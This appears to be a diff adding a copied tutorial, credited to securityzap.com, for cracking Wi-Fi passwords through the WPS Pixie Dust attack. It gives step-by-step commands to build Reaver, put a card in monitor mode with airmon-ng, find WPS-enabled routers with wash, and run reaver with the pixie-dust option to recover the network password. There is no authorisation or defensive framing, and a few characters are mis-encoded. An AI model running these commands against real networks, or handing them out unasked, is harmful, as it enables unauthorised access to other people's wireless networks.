@@ -1,0 +1,53 @@
+Step 1: Dependencies
+Make sure that you have all following dependencies updated:
+
+Go to terminal and type: apt-get update
+apt-get install build-essential
+apt-get install libpcap-dev
+apt-get install sqlite3
+apt-get install libsqlite3-dev
+apt-get install pixiewps
+Step 2: GitHub Fork
+You will need to download, compile and install Reaver, from GitHub. Issue git clone https://github.com/t6x/reaver-wps-fork-t6x
+
+Step 3: Install
+From your pwd, type¡­
+
+cd reaver-wps-fork-t6x/
+cd src/
+./configure
+make
+make install
+or  use ¡®sudo make install¡¯ if you are not a root user.
+
+- See more at: http://securityzap.com/hack-wifi-via-wps-pixie-dust-attack/#sthash.BeHZGX3T.dpuf
+
+Step 4: Monitor Mode
+Put your interface into monitor mode via airmon-ng:
+
+airmon-ng start wlan0
+
+Use your wireless card number instead of wlan0
+
+Step 5: Find a Potential Target
+The easiest way to find a target with WPS enabled is by using following command:
+
+wash -i mon0
+
+Which will give BSSID Channel RSSI WPS Version WPS Locked and ESSID info.
+
+We are going to need BSSID and Channel sequence. BSSID looks like this
+
+XX:XX:XX:XX:XX:XX
+
+Channel sequence should be a number.
+
+Step 6: Attacking
+Once you have gathered all the information, just type following command in terminal:
+
+reaver -i mon0 -b XX:XX:XX:XX:XX:XX -c {Channel} -vvv -K 1 -f
+
+Step 7: Success!
+The password will be shown on the right side of the password field! This attack is not compatible with all routers.Pixie Dust needs maximum 40 minutes for an attack while others might require several hours.
+
+- See more at: http://securityzap.com/hack-wifi-via-wps-pixie-dust-attack/#sthash.BeHZGX3T.dpuf
